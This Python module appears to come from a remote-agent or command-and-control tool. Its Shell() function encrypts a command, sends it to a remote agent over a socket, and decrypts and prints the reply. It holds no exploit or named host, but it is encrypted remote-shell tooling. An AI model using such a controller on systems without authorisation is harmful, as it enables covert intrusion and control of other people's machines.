
import crypto
import logging

def Shell(channel, password, command):
    """Try to interact with remote agent with a shell"""
# Module to send a shell command to remote agent

    logger = logging.getLogger('main')

    #crypto = Crypto(password)

    # Define a buffer size, 1024 bytes
    bufferSize = 4096

    if command == b'':
        pass
    else:
        # Else, send command to remote agent
        logger.debug(f'Shell command before encryption : {command}')
        command = crypto.encrypt_message(password, command)
        logger.debug(f'Shell command after encryption : {command}')
        channel.sendall(command.encode())

        rawResponse, tempBuffer = b'', b''
        # While True, receive data
        while True:
            logger.debug('recv from socket...')

            tempBuffer = channel.recv(bufferSize)
            rawResponse += tempBuffer
            
            logger.debug(f'Partial answer : {rawResponse}')
            logger.debug(f'Raw answer lengh : {len(rawResponse)}')
            #logger.debug(f'Temporary buffer : {tempBuffer}')
            # If all data are smaller than the buffer size, break While loop
            if len(tempBuffer) < bufferSize:
                logger.debug('break recv while loop')
                break
        # Decode bytes to string to read the answer of the remote agent
        
        shellReponseEncrypted = rawResponse.decode()
        shellResponse = crypto.decrypt_message(password, shellReponseEncrypted)
        logger.debug(f'Encrypted answer : {shellReponseEncrypted}')
        logger.debug(f'Decrypted answer : {shellResponse}')
        # Print agent's answer
        print(shellResponse)

